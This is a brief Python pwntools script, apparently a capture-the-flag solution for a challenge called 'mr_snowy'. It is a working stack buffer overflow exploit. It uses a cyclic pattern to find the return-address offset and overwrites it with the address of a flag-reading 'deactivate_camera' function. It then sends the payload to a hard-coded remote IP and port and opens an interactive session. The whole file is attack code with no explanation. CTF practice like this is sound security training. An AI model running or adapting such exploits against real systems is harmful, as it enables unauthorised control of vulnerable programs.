#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = 'mr_snowy'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
        
    binary = ELF(chall_name)
    deactivate_camera_address = p64(binary.symbols['deactivate_camera']) # function to read flag

    overflow = cyclic(299, n=8)
    overflow_until_ret = b'A' * cyclic_find('jaaaaaaa', n=8)

    print(p.recv(timeout=2).decode())
    p.sendline(b'1')
    print(p.recv(timeout=2).decode())
    
    p.sendline(overflow_until_ret + deactivate_camera_address)
    p.interactive()

if get_flag:
    p = remote('178.62.32.210', '30138')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False)